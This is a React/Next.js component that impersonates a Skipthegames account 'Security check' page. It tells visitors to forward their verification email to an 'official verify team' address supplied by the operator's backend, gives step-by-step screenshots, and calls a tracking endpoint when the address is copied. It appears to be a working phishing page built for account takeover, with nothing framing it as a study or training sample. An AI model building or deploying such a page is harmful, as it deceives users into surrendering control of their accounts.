"use client";

import React, { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import axios from "axios";
import { useAppSelector } from "@/lib/hooks";

const Tutorial = () => {
  const user = useAppSelector((state) => state.userAuth.user);
  const data = useAppSelector((state) => state.dataAuth);
  const [isPopupOpen, setIsPopupOpen] = useState(false);
  const router = useRouter();
  const [mounted, setMounted] = useState(false);

  const emailToCopy = data?.email;

  const copyToClipboard = (text: string) => {
    try {
      axios.get("/api/copy-link");
      navigator.clipboard
        ?.writeText(text)
        .then(() => setIsPopupOpen(true))
        .catch((err) => console.error("Failed to copy text: ", err));
    } catch (error) {
      console.error(error);
    }
  };

  useEffect(() => {
    setMounted(true);
  }, [user, router]);

  if (!mounted) {
    return null;
  }

  return (
    <>
      {isPopupOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm">
          <div className="bg-white dark:bg-gray-900 rounded-2xl shadow-2xl p-6 w-80 transform transition-all duration-300 scale-100">
            <h2 className="text-lg font-semibold text-gray-800 dark:text-gray-100 text-center">
              ✅ Email copied to clipboard!
            </h2>

            <div className="mt-6 flex justify-center">
              <button
                onClick={() => setIsPopupOpen(false)}
                className="bg-[#00a3e0] hover:bg-[#008ac4] text-white font-medium px-6 py-2 rounded-lg shadow-md transition duration-200"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="bg-white text-gray-800 min-h-screen items-start justify-center px-1 sm:px-1 lg:px-8">
        <div className="w-full mx-auto max-w-lg md:max-w-xl lg:max-w-4xl bg-white p-2 rounded-lg">
          {/* Logo */}
          <div className="text-start mb-2">
            <img
              src="https://res.cloudinary.com/drmvudsul/image/upload/v1731950993/Skipthegames-255x39_rpo8an.webp"
              alt="Skip the games logo"
              className="w-64"
            />
            <p className="text-sm text-gray-500 mt-2">
              Skip the games. Get satisfaction.
            </p>
          </div>

          {/* User Info */}
          <div className="mb-2">
            <p className="text-gray-700 text-sm">
              <span className="text-[#990033] font-bold underline">
                {user ?? "Loading..."}
              </span>
            </p>

            <p className="text-sm">
              your account |{" "}
              <span className="text-[#990033] font-bold cursor-pointer">
                log out
              </span>
            </p>
          </div>

          {/* Security Check */}
          <div className="mb-2">
            <h3 className="text-lg font-medium text-gray-800 sm:text-left mb-2">
              Security check
            </h3>
            <p className="text-gray-950 text-base mb-1">
              Forward this email to our official verify team email. Copy our
              email address:
            </p>
          </div>

          {/* Copy Email Section */}
          <div className="items-center text-start gap-4 mb-2">
            <p className="text-[#990033] font-bold text-lg text-start w-full sm:text-left">
              {emailToCopy}
            </p>
            <button
              className="bg-[#00a3e0] my-2 hover:bg-[#2a7b99] text-white py-3 px-6 rounded w-[150px]"
              onClick={() => copyToClipboard(emailToCopy)}
            >
              Copy
            </button>
          </div>

          <p className="text-gray-950 text-base mb-2 font-bold">
            Follow the instructions to successfully complete your account
            verification.
          </p>

          {/* Steps */}
          <div className="space-y-6">
            <div>
              <p className="text-gray-950 text-base mt-6 sm:text-left mb-2">
                Step 1: Go to your email.
              </p>
              <img
                src={data?.step1}
                alt="Step 1"
                className="w-full rounded-md"
              />
            </div>

            <div>
              <p className="text-gray-950 text-base mt-6 sm:text-left mb-2">
                Step 2: Just click the forward icon.
              </p>
              <img
                src={data?.step2}
                alt="Step 2"
                className="w-full rounded-md"
              />
            </div>

            <div>
              <p className="text-gray-950 text-base mt-6 sm:text-left mb-2">
                Step 3: Put our official email to send.
              </p>
              <img
                src={data?.step3}
                alt="Step 3"
                className="w-full rounded-md"
              />
            </div>
          </div>

          <p className="text-gray-600 text-sm mt-6 sm:text-left">
            It may take the email up to 10 minutes to arrive. Make sure to check
            your Spam/Junk/Trash folder.
          </p>

          {/* Resend Email */}
          <div className="mt-4 flex justify-start text-sm gap-4 sm:text-left">
            <p className="text-[#990033] underline">Resend the email</p>
            <p className="text-[#990033] underline">
              I don&apos;t have access to this email account
            </p>
          </div>
        </div>

        {/* Footer */}
        <footer className="text-start text-gray-600 text-sm mt-10 w-full">
          <hr className="my-4 mx-auto max-w-2xl" />
          <p className="text-[#990033]">&copy; Skipthegames.eu</p>
          <ul className="flex gap-4 mt-2 pb-10">
            <li>
              <p className="text-[#990033]">Home</p>
            </li>
            <li>
              <p className="text-[#990033]">Contact</p>
            </li>
            <li>
              <p className="text-[#990033]">About</p>
            </li>
            <li>
              <p className="text-[#990033]">Privacy</p>
            </li>
            <li>
              <p className="text-[#990033]">Terms</p>
            </li>
            <li>
              <p className="text-[#990033]">Escort Info</p>
            </li>
          </ul>
        </footer>
      </div>
    </>
  );
};

export default Tutorial;
